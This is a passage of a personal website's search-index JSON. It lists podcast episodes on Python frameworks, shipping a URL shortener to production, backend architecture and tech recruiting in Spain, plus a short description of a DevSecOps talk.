Jonathan","text":"<p>Date: 2025-11-30  </p> <p>Episode 1 kicks off with Ssali Jonathan - software engineer and open-source enthusiast. We talk about his journey in tech, his content creation, and Python web frameworks. Topics include FastAPI, Starlette, databases, Redis, and learning as a software engineer.</p>"},{"location":"podcast/episodes/episode1-jod35/","title":"Episode 1 - Ssali Jonathan","text":"","tags":["podcast","software","dev"]},{"location":"podcast/episodes/episode1-jod35/#episode-1-ssali-jonathan","title":"Episode 1 - Ssali Jonathan","text":"<p>    Your browser does not support the audio element. </p> <p>Episode 1 kicks off with Ssali Jonathan \u2014 software engineer and open-source enthusiast. We talk about his journey in tech, his content creation, and Python web frameworks. A relaxed, honest conversation about building, learning, and growing in software - with mate on the side.</p> <p>Topics we cover:  - Exploring Python web frameworks. - Diving into FastAPI and Starlette. - Database choices and real-world experiences. - Redis beyond a simple key-value store. - Learning and growth as a software engineer.</p> <p>Connect with Ssali Jonathan:  - GitHub: https://github.com/jod35 - Website: https://jod35.github.io/site/ - YouTube: https://www.youtube.com/@SsaliJonathan - Twitter (X): https://twitter.com/jod35_</p>","tags":["podcast","software","dev"]},{"location":"podcast/episodes/episode2-martin/","title":"Episode 2 - Mart\u00edn Torre Castro","text":"","tags":["podcast","software","python","architecture","performance"]},{"location":"podcast/episodes/episode2-martin/#episode-2-martin-torre-castro","title":"Episode 2 - Mart\u00edn Torre Castro","text":"<p>    Your browser does not support the audio element. </p> <p>Episode 2 features Mart\u00edn Torre Castro - software architect, performance engineer, and organizer of the Python Coru\u00f1a community. We talk about performance engineering in real systems, software architecture in practice, Python communities in Spain, and lessons learned from building and scaling production systems. A relaxed, honest conversation about building, learning, and growing in software - with mate on the side.</p> <p>Topics we cover:  - The Python Coru\u00f1a community. - Performance engineering and load testing in real-world systems. - Software architecture decisions and common mistakes. - Databases. - Career growth, learning, and sharing knowledge as an engineer.</p> <p>Connect with Mart\u00edn Torre Castro:  - LinkedIn: https://www.linkedin.com/in/martin-torre-castro/</p>","tags":["podcast","software","python","architecture","performance"]},{"location":"podcast/episodes/episode3-tinyurl/","title":"Episode 3 \u2013 Building TinyURL in Production","text":"","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode3-tinyurl/#episode-3-dev-diary-building-tinyurl-in-production","title":"Episode 3 \u2013 Dev Diary: Building TinyURL in Production","text":"<p>    Your browser does not support the audio element. </p> <p>In this episode, I walk through the full journey of building and shipping a TinyURL-like service to a real production environment.</p> <p>This is not a theory-heavy episode. It is a hands-on breakdown of what actually happens when you take a backend system from local development to production: domains, SSL, reverse proxies, caching, databases, CI/CD pipelines, and all the mistakes along the way.</p> <p>I start with a simple idea - shorten a URL - and end up deep inside system design, distributed systems, and production debugging.</p>","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode3-tinyurl/#what-i-talk-about","title":"What I Talk About","text":"<p>Goals behind the project - Learning how to ship a real system to production - Deploying on AWS EC2 - Configuring domains and SSL - Understanding ACID guarantees in practice - Building a real CI/CD pipeline</p> <p>What a URL shortener really does - Why URL shorteners are read-heavy systems - Base62 encoding and ID generation - Hashing vs sequential IDs - Collision avoidance and scalability tradeoffs - Redirects, caching, and performance</p> <p>System architecture - FastAPI as the backend API - PostgreSQL for persistence - Redis for caching hot paths - Nginx as a reverse proxy and SSL terminator - Gunicorn for production-grade serving</p> <p>Performance and scale - Cache-aside strategy with Redis - Why redirects must be fast - Read-heavy traffic patterns - Database bottlenecks and replication concepts</p> <p>CI/CD and deployment - Automatic deployment on push to main - Docker and Docker Compose - Common pipeline mistakes - Environment configuration issues - Debugging production failures</p> <p>What went wrong - Path and volume issues - Nginx misconfigurations - SSL and Certbot challenges - Redis connection problems - Async testing pitfalls</p> <p>What I learned - How production systems actually fail - Why observability matters - How small misconfigurations cause big outages - How much caching changes system behavior - Why shipping teaches faster than tutorials</p>","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode3-tinyurl/#technologies-used","title":"Technologies Used","text":"<ul> <li>FastAPI \u2013 backend API</li> <li>Gunicorn \u2013 production server</li> <li>PostgreSQL \u2013 relational database</li> <li>Redis \u2013 caching layer</li> <li>Nginx \u2013 reverse proxy and SSL</li> <li>Docker &amp; Docker Compose</li> <li>AWS EC2</li> <li>GitHub Actions \u2013 CI/CD</li> <li>Pytest \u2013 testing</li> </ul>","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode3-tinyurl/#what-i-want-to-do-next","title":"What I Want to Do Next","text":"<ul> <li>Improve storage efficiency in production</li> <li>Handle multiple containers safely for ID generation</li> <li>Add rate limiting and abuse protection</li> <li>Add analytics and observability</li> <li>Explore distributed ID generation strategies</li> </ul>","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode3-tinyurl/#references-further-reading","title":"References &amp; Further Reading","text":"<ul> <li>FastAPI: https://fastapi.tiangolo.com/</li> <li>Redis: https://redis.io/docs/latest/</li> <li>Nginx: https://nginx.org/en/docs/</li> <li>Gunicorn: https://docs.gunicorn.org/en/stable/</li> <li>PostgreSQL: https://www.postgresql.org/docs/</li> <li>Base62: https://en.wikipedia.org/wiki/Base62</li> </ul> <p>Related articles: - Demystifying Nginx: https://medium.com/gitconnected/demystifying-nginx-from-reverse-proxy-to-secure-gateway-149c75b99ad8 - Shipping FastAPI like a Pro: https://medium.com/python-in-plain-english/shipping-fastapi-like-a-pro-my-ci-cd-pipeline-for-tinyurl-c27b68434f04</p> <p>This episode is for anyone who wants to stop building demos and start shipping real systems \u2014 and is ready to learn from things breaking along the way.</p>","tags":["podcast","backend","fastapi","redis","nginx","devops","system-design"]},{"location":"podcast/episodes/episode4-roberto/","title":"Episode 4 - Roberto J. Garc\u00eda Navarro","text":"","tags":["podcast","software","backend","fastapi","go","architecture","event-driven"]},{"location":"podcast/episodes/episode4-roberto/#episode-4-roberto-j-garcia-navarro","title":"Episode 4 - Roberto J. Garc\u00eda Navarro","text":"<p>    Your browser does not support the audio element. </p> <p>Episode 4 features Roberto J. Garc\u00eda Navarro - Senior Backend Engineer. We talk about how a junior developer can grow into a backend architect, using Roberto\u2019s real career path as a blueprint. We dive into Go, event-driven architecture, and how to make good architectural decisions in real-world systems. A practical, honest conversation about career growth, system design, and learning what actually matters - with mate on the side.</p> <p>Topics we cover:  - Growing from a junior developer into a backend architect. - Python and Go: when and why to expand your stack. - Event-driven architecture in practice. - Architectural decision-making. - Career growth, mentoring, and sharing knowledge as an engineer.</p> <p>Connect with Roberto J. Garc\u00eda Navarro:  - GitHub: https://github.com/soulcodex - LinkedIn: https://www.linkedin.com/in/roberto-garcia-navarro/  </p> <p>References &amp; Resources Mentioned: </p> <ul> <li> <p>Carlos Buenosvinos: https://github.com/carlosbuenosvinos</p> </li> <li> <p>Christian Soronellas: https://theunic.github.io/</p> </li> <li> <p>Event-Driven Architecture in Golang: Building Complex Systems - Michael Stack   Google Books: https://share.google/6CkeVn39vePYZdfkZ</p> </li> <li> <p>Mastering Domain-Driven Design: Collaborative Modeling with Domain Storytelling, Event Storming, and Context Mapping - Annegret Junker   Amazon: https://amzn.eu/d/0RUZzvM</p> </li> </ul>","tags":["podcast","software","backend","fastapi","go","architecture","event-driven"]},{"location":"podcast/episodes/episode5-paula/","title":"Episode 5 - Paula Medina Mora","text":"","tags":["podcast","hr","startups","recruitment","career-growth","spain","galicia"]},{"location":"podcast/episodes/episode5-paula/#episode-5-paula-medina-mora","title":"Episode 5 - Paula Medina Mora","text":"<p>    Your browser does not support the audio element. </p> <p>\u00a1\u00a1Click and add this episode to your podcast app!! </p> <p>Episode 5 features Paula Medina Mora - HR Expert and Founder of MakingHR.</p> <p>We peel back the curtain on the hiring world to see what actually happens \u201con the other side\u201d of the desk. We talk about how to build a CV that stands out, the reality of the Spanish tech market, and how to navigate the recruitment process from the first LinkedIn message to signing the contract. An honest look at the human side of software engineering, with practical advice for developers at any level - and a cup of mate on the side.</p> <p>Topics we cover:  - Effective Job Hunting: Reading job descriptions and knowing if you are the right fit. - The \u201cRecruiter\u2019s Lens\u201d: How HR searches for candidates. - Behind the Scenes: Is the recruitment process safe and discrete for candidates? - CV &amp; LinkedIn: Balancing technical depth with impact to be \u201cfound\u201d by recruiters. - Certifications, Degrees, and Recommendations: What actually moves the needle? - The Screening Call: What HR looks for in the first 15 minutes beyond technical skills. - Negotiation &amp; Contracts: Handling salary ranges and what to check in a Spanish \u201cConvenio.\u201d - Regional Context: The tech market in Galicia.</p> <p>Connect with Paula Medina Mora: </p> <ul> <li>Website: https://makinghr.com/</li> <li>LinkedIn: https://www.linkedin.com/in/paulamedinamora/</li> </ul>","tags":["podcast","hr","startups","recruitment","career-growth","spain","galicia"]},{"location":"videos/","title":"Videos","text":"<p>Welcome to my video library! Here you can find tutorials, talks, and demos I\u2019ve created or contributed to.</p>"},{"location":"videos/#featured-videos","title":"Featured Videos","text":"<ul> <li>Spain DevSecOps</li> </ul>"},{"location":"videos/spain-devsecops/","title":"Motivating the average developer to engage in DevSecOps","text":"<p>In this engaging lecture, we\u2019ll explore how everyday developers can dive into the world of secure development operations. Through hands-on activities, we\u2019ll unveil the simplicity of creating vulnerabilities in Docker. Get ready for a practical journey that will empower you to strengthen your software security skills and become a vital part of the DevSecOps movement!</p>"}]}